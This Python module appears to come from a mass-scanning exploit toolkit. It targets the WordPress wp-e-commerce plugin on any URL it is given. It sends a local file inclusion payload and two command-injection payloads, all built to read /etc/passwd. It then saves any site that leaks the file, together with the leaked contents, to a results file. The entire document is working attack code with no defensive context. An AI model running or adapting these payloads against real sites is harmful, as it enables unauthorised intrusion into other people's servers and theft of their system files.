import requests
from Exploits.colors import *


def eCommerce(url):
    req = requests.get(url+"/wp-content/plugins/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=/etc/passwd")
    if "root" in req.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"LFI: {req.url}"+ "\n" +req.text+ '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} eCom LFI {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} eCom LFI {PURPLE}=> {RED}Not Vuln")
    req2 = requests.get(url+"/wp-content/plugins/wp-e-commerce/wpsc-admin/ajax.php?wpsc_action=cat /etc/passwd")
    if "root" in req2.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"RCE: {req2.url}" + '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} eCom RCE {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
        
        


    req3 = requests.get(url+"/wp-content/plugins/wp-e-commerce/wpsc-admin/display-sales-logs.php?c=cat /etc/passwd")
    if "root" in req3.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"RCE: {req3.url}" + '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} eCom RCE {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} eCom RCE {PURPLE}=> {RED}Not Vuln")

